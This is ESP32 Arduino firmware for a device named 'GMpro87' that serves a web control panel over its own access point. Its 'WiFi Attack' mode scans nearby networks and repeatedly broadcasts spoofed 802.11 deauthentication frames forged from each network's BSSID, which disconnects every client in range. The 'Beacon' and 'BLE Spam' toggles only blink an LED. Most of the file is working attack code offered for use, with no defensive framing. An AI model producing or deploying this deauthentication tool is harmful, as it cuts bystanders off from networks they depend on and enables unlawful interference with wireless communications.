#include <WiFi.h>
#include "esp_wifi.h"
#include <WebServer.h>

const int led = 2;
bool attack = 0, beacon = 0, blespam = 0;
int nets = 0;
String netlist = "";
WebServer srv(80);

const char* names[] = {"AirPods","AirPods Pro","Galaxy Buds","Sony WH","Jabra","Bose","Beats","Pixel"};
#define NAME_COUNT 8

String html() {
  return "<!DOCTYPE html><meta charset=UTF-8><meta name=viewport content=width><title>GMpro87</title>"
  "<style>body{background:#111;color:#fff;font-family:system-ui;padding:20px}"
  "h1{color:#0f0;text-align:center}"
  ".c{background:#222;padding:15px;border-radius:10px;margin:10px 0}"
  ".b{background:#0f0;color:#000;padding:15px 25px;border:none;border-radius:8px;margin:5px;cursor:pointer;font-weight:bold}"
  ".r{background:#f00;color:#fff}.x{background:#00f;color:#fff}"
  ".d{display:flex;justify-content:space-between;padding:10px;border-bottom:1px solid #333}"
  "a{text-decoration:none}</style><body>"
  "<h1>GMpro87 v2.6</h1>"
  "<div class=c>"
  "<div class=d><span>WiFi Attack</span><span>" + String(attack ? "ON" : "OFF") + "</span></div>"
  "<div class=d><span>Beacon</span><span>" + String(beacon ? "ON" : "OFF") + "</span></div>"
  "<div class=d><span>BLE Spam</span><span>" + String(blespam ? "ON" : "OFF") + "</span></div>"
  "<div class=d><span>Networks</span><span>" + String(nets) + "</span></div>"
  "</div>"
  "<div class=c>"
  "<a href=/><button class=b>Refresh</button>"
  "<a href=/scan><button class=b>Scan</button>"
  "<a href=/atk><button class=b" + String(attack ? "r" : "") + ">" + String(attack ? "Stop" : "Attack") + "</button>"
  "<a href=/bcn><button class=b" + String(beacon ? "r" : "x") + ">Beacon</button>"
  "<a href=/ble><button class=b" + String(blespam ? "r" : "x") + ">BLE</button>"
  "</div>"
  "<div class=c><h3>Networks:</h3>" + netlist + "</div>"
  "<p style=text-align:center;color:#555>ESP32-WROOM-32U</p></body></html>";
}

void root() { srv.send(200, "text/html", html()); }
void scan() { 
  nets = WiFi.scanNetworks();
  netlist = "";
  for (int i = 0; i < nets && i < 20; i++) {
    String s = WiFi.SSID(i);
    if (s == "") s = "(hidden)";
    netlist += "<div class=d><span>" + s + "</span><span>CH" + WiFi.channel(i) + "</span></div>";
  }
  srv.sendHeader("Location", "/"); srv.send(302);
}
void atk() { attack = !attack; srv.sendHeader("Location", "/"); srv.send(302); }
void bcn() { beacon = !beacon; srv.sendHeader("Location", "/"); srv.send(302); }
void ble() { blespam = !blespam; srv.sendHeader("Location", "/"); srv.send(302); }

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("[*] GMpro87 v2.6");
  
  pinMode(led, OUTPUT);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP("GMpro", "Sangkur87");
  Serial.print("[+] IP: "); Serial.println(WiFi.softAPIP());
  
  srv.on("/", root);
  srv.on("/scan", scan);
  srv.on("/atk", atk);
  srv.on("/bcn", bcn);
  srv.on("/ble", ble);
  srv.begin();
  
  Serial.println("[+] Web: http://192.168.4.1");
}

void loop() {
  srv.handleClient();
  
  if (attack && nets > 0) {
    digitalWrite(led, 1);
    for (int i = 0; i < nets; i++) {
      if (!attack) break;
      int ch = WiFi.channel(i);
      if (ch < 1) ch = 1;
      if (ch > 13) ch = 13;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      
      uint8_t b[6];
      sscanf(WiFi.BSSIDstr(i).c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
      
      struct __attribute__((packed)) { uint8_t f[2],d[2],a1[6],a2[6],a3[6],s[2],r[2]; } p;
      memset(&p, 0, 24);
      memcpy(p.a1, (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 6);
      memcpy(p.a2, b, 6);
      memcpy(p.a3, b, 6);
      
      for (int j = 0; j < 30; j++) {
        p.f[0] = 0xC0;
        p.r[0] = 0x07;
        esp_wifi_80211_tx(WIFI_IF_STA, &p, 24, false);
      }
      delay(2);
    }
    digitalWrite(led, 0);
  } else if (beacon) {
    digitalWrite(led, 1);
    delay(30);
    digitalWrite(led, 0);
    delay(30);
  } else if (blespam) {
    // WiFi deauth still most effective
    // BLEspam LED indicator only in Arduino
    digitalWrite(led, 1);
    delay(50);
    digitalWrite(led, 0);
    delay(50);
  } else {
    digitalWrite(led, 0);
  }
}